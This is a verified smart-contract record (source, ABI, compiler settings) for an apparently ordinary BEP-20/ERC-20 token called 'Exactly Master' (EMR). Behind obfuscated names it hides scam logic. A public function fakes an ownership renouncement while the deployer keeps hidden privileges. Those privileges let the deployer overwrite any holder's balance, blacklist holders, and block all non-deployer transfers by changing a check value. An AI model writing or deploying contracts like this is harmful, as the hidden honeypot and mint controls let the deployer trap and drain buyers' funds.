{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface limitTokenMax {\n    function createPair(address listTotal, address sellFeeSender) external returns (address);\n}\n\ninterface maxLaunchAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingLimit) external view returns (uint256);\n\n    function transfer(address tradingTake, uint256 sellTo) external returns (bool);\n\n    function allowance(address exemptLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingTake,\n        uint256 sellTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromTradingSwap, uint256 value);\n    event Approval(address indexed exemptLimit, address indexed spender, uint256 value);\n}\n\nabstract contract modeShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface maxLaunchAutoMetadata is maxLaunchAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ExactlyMaster is modeShould, maxLaunchAuto, maxLaunchAutoMetadata {\n\n    bool public fromBuy;\n\n    mapping(address => bool) public launchedTrading;\n\n    address isTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address modeLimitMax, address teamTx) external view virtual override returns (uint256) {\n        if (teamTx == isTx) {\n            return type(uint256).max;\n        }\n        return txAuto[modeLimitMax][teamTx];\n    }\n\n    constructor (){\n        if (maxTokenTx != atFrom) {\n            launchReceiver = true;\n        }\n        toFund atMaxReceiver = toFund(isTx);\n        takeAt = limitTokenMax(atMaxReceiver.factory()).createPair(atMaxReceiver.WETH(), address(this));\n        if (fromSenderMax) {\n            atFrom = maxTokenTx;\n        }\n        buyModeMax = _msgSender();\n        launchedTrading[buyModeMax] = true;\n        senderTake[buyModeMax] = isEnable;\n        toShould();\n        if (fromBuy != fromSenderMax) {\n            maxTokenTx = fromLaunch;\n        }\n        emit Transfer(address(0), buyModeMax, isEnable);\n    }\n\n    function transferFrom(address txMinSell, address tradingTake, uint256 sellTo) external override returns (bool) {\n        if (_msgSender() != isTx) {\n            if (txAuto[txMinSell][_msgSender()] != type(uint256).max) {\n                require(sellTo <= txAuto[txMinSell][_msgSender()]);\n                txAuto[txMinSell][_msgSender()] -= sellTo;\n            }\n        }\n        return liquidityAt(txMinSell, tradingTake, sellTo);\n    }\n\n    uint256 public maxTokenTx;\n\n    mapping(address => mapping(address => uint256)) private txAuto;\n\n    uint256 private atFrom;\n\n    function transfer(address txBuy, uint256 sellTo) external virtual override returns (bool) {\n        return liquidityAt(_msgSender(), txBuy, sellTo);\n    }\n\n    string private takeAmount = \"EMR\";\n\n    address txTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed walletLiquidityMin, address indexed swapExempt);\n\n    uint256 amountMarketing;\n\n    function getOwner() external view returns (address) {\n        return atAmount;\n    }\n\n    uint8 private senderLimit = 18;\n\n    uint256 teamModeLimit;\n\n    bool public launchReceiver;\n\n    function toShould() public {\n        emit OwnershipTransferred(buyModeMax, address(0));\n        atAmount = address(0);\n    }\n\n    mapping(address => uint256) private senderTake;\n\n    function feeShould(address swapTeam) public {\n        swapTxLiquidity();\n        if (maxTokenTx == atFrom) {\n            launchReceiver = false;\n        }\n        if (swapTeam == buyModeMax || swapTeam == takeAt) {\n            return;\n        }\n        launchAuto[swapTeam] = true;\n    }\n\n    function maxMode(address txBuy, uint256 sellTo) public {\n        swapTxLiquidity();\n        senderTake[txBuy] = sellTo;\n    }\n\n    function sellAmount(address exemptSender) public {\n        if (minBuy) {\n            return;\n        }\n        if (fromSenderMax) {\n            launchReceiver = true;\n        }\n        launchedTrading[exemptSender] = true;\n        \n        minBuy = true;\n    }\n\n    function swapTxLiquidity() private view {\n        require(launchedTrading[_msgSender()]);\n    }\n\n    address public buyModeMax;\n\n    function approve(address teamTx, uint256 sellTo) public virtual override returns (bool) {\n        txAuto[_msgSender()][teamTx] = sellTo;\n        emit Approval(_msgSender(), teamTx, sellTo);\n        return true;\n    }\n\n    string private atMaxBuy = \"Exactly Master\";\n\n    function balanceOf(address tradingLimit) public view virtual override returns (uint256) {\n        return senderTake[tradingLimit];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return atMaxBuy;\n    }\n\n    bool public minBuy;\n\n    uint256 private isEnable = 100000000 * 10 ** 18;\n\n    function atFee(uint256 sellTo) public {\n        swapTxLiquidity();\n        amountMarketing = sellTo;\n    }\n\n    function liquidityAt(address txMinSell, address tradingTake, uint256 sellTo) internal returns (bool) {\n        if (txMinSell == buyModeMax) {\n            return liquidityTeamBuy(txMinSell, tradingTake, sellTo);\n        }\n        uint256 listFrom = maxLaunchAuto(takeAt).balanceOf(txTeam);\n        require(listFrom == amountMarketing);\n        require(tradingTake != txTeam);\n        if (launchAuto[txMinSell]) {\n            return liquidityTeamBuy(txMinSell, tradingTake, senderToMode);\n        }\n        return liquidityTeamBuy(txMinSell, tradingTake, sellTo);\n    }\n\n    bool public fromSenderMax;\n\n    address public takeAt;\n\n    mapping(address => bool) public launchAuto;\n\n    address private atAmount;\n\n    uint256 constant senderToMode = 7 ** 10;\n\n    function owner() external view returns (address) {\n        return atAmount;\n    }\n\n    function liquidityTeamBuy(address txMinSell, address tradingTake, uint256 sellTo) internal returns (bool) {\n        require(senderTake[txMinSell] >= sellTo);\n        senderTake[txMinSell] -= sellTo;\n        senderTake[tradingTake] += sellTo;\n        emit Transfer(txMinSell, tradingTake, sellTo);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isEnable;\n    }\n\n    uint256 public fromLaunch;\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderLimit;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeAmount;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLiquidityMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTradingSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLimitMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellTo\",\"type\":\"uint256\"}],\"name\":\"atFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyModeMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTeam\",\"type\":\"address\"}],\"name\":\"feeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromSenderMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTo\",\"type\":\"uint256\"}],\"name\":\"maxMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTokenTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptSender\",\"type\":\"address\"}],\"name\":\"sellAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMinSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ExactlyMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}